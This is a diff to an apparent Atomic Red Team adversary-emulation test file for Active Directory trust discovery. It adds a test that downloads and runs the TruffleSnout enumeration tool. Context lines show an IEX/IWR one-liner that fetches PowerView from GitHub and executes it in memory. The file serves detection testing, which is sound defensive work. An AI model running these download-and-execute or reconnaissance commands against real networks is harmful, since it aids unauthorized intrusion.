@@ -132,3 +132,33 @@ atomic_tests:
       [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
       IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Get-ForestTrust -Verbose
     name: powershell
+
+- name: TruffleSnout - Listing AD Infrastructure
+  auto_generated_guid: ea1b4f2d-5b82-4006-b64f-f2845608a3bf
+  description: |
+    Iterative AD discovery toolkit for offensive operators. Situational awareness and targeted low noise enumeration. Preference for OpSec.- https://github.com/dsnezhkov/TruffleSnout
+  supported_platforms:
+  - windows
+  input_arguments:
+    trufflesnout_path:
+      description: Path to the TruffleSnout executable
+      type: Path
+      default: PathToAtomicsFolder\T1482\src\TruffleSnout.exe
+    domain:
+      description: Domain name to search on
+      type: String
+      default: '%userdomain%'
+  dependency_executor_name: powershell
+  dependencies:
+  - description: |
+      TruffleSnout.exe must exist on disk at specified location (#{trufflesnout_path})
+    prereq_command: |
+      if (Test-Path #{trufflesnout_path}) {exit 0} else {exit 1}
+    get_prereq_command: |
+      New-Item -ItemType Directory (Split-Path #{trufflesnout_path}) -Force | Out-Null
+      Invoke-WebRequest -Uri "https://github.com/dsnezhkov/TruffleSnout/releases/download/0.5/TruffleSnout.exe" -OutFile #{trufflesnout_path}
+  executor:
+    command: |
+      #{trufflesnout_path} forest -n #{domain}
+      #{trufflesnout_path} domain -n #{domain}
+    name: command_prompt
